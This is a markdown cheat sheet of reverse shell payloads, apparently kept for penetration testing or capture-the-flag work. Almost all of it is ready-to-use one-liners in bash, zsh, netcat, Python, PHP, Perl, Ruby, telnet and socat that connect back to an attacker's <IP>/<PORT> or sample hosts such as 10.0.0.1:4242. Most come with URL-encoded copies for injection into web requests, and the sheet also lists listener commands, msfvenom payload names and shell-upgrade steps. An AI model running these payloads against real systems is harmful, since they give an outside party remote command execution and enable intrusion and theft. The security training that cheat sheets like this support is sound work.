# Reverse Shell
## Online 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md

## Listener
`nc -lnvp <PORT>`
`rlwrap -cAr nc -lnvp <PORT>` (upgraded shell)
```socat file:`tty`,raw,echo=0 tcp-listen:<PORT>``` (interactive shell, if used with socat)

## Reverse Shell
#### Bash
`bash -c "sh -i >& /dev/tcp/<IP>/<PORT> 0>&1"`
`bash%20-c%20%22sh%20-i%20%3E&%20/dev/tcp/<IP>/<PORT>%200%3E&1%22`

`bash -c "sh -l > /dev/tcp/<IP>/<PORT> 0<&1 2>&1"`
`bash%20-c%20%22sh%20-l%20%3E%20/dev/tcp/<IP>/<PORT>%200%3C&1%202%3E&1%22`

`bash -c "0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196"`
`bash%20-c%20%220%3C&196;exec%20196%3C%3E/dev/tcp/<IP>/<PORT>;%20sh%20%3C&196%20%3E&196%202%3E&196%22`

`exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done`

`sh -i 5<> /dev/tcp/127.0.0.1/6556 0<&5 1>&5 2>&5`

## Zsh
`zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 6556 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`

#### Netcat
`nc -e /bin/sh <IP> <PORT>`
`nc%20-e%20/bin/sh%20<IP>%20<PORT>`

`nc -c /bin/sh <IP> <PORT>`
`nc%20-c%20/bin/sh%20<IP>%20<PORT>`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f`
`rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E&1%7Cnc%20<IP>%20<PORT>%20%3E/tmp/f`

#### Python
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
`python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22<IP>%22,<PORT>));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);'`

`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

`python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`


#### PHP
`php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`
`php%20-r%20'$sock=fsockopen(%22<IP>%22,<PORT>);exec(%22/bin/sh%20-i%20%3C&3%20%3E&3%202%3E&3%22);'`

#### Perl
`perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
`perl%20-e%20'use%20Socket;$i=%22<IP>%22;$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i))))%7Bopen(STDIN,%22%3E&S%22);open(STDOUT,%22%3E&S%22);open(STDERR,%22%3E&S%22);exec(%22/bin/sh%20-i%22);%7D;'`

#### Ruby
`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
`ruby%20-rsocket%20-e%20'exit%20if%20fork;c=TCPSocket.new(%22<IP>%22,%22<PORT>%22);while(cmd=c.gets);IO.popen(cmd,%22r%22)%7B%7Cio%7Cc.print%20io.read%7Dend'`

#### Telnet
`TF=$(mktemp -u); mkfifo $TF && telnet <IP> <PORT> 0<$TF | /bin/sh 1>$TF`
`TF=$(mktemp%20-u);%20mkfifo%20$TF%20&&%20telnet%20<IP>%20<PORT>%200%3C$TF%20%7C%20/bin/sh%201%3E$TF`

#### Socat (+interactive)
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>`
`socat%20exec:'bash%20-li',pty,stderr,setsid,sigint,sane%20tcp:<IP>:<PORT>`

#### PowerShell
-

#### msfvenom
linux/x64/meterpreter/reverse_tcp (1)
linux/x64/meterpreter_reverse_tcp
linux/x64/shell/reverse_tcp
linux/x64/shell_reverse_tcp

windows/meterpreter/reverse_tcp (1)
windows/meterpreter_reverse_tcp
windows/shell/reverse_tcp (1)
windows/shell_reverse_tcp

windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter_reverse_tcp
windows/x64/shell/reverse_tcp
windows/x64/shell_reverse_tcp

## Interactive shell
`/bin/bash -i`
`python3 -c "import pty; pty.spawn('/bin/bash')"`
`python -c "import pty; pty.spawn('/bin/bash')"`
`script -qc /bin/bash /dev/null`

## Upgrade shell
`ctrl+z`
`stty raw -echo; fg` (USE ONELINER IF YOU USE ZSH)
`export TERM=xterm`
`export TERM=xterm-256color`
`stty rows <ROWS> columns <COLUMNS>`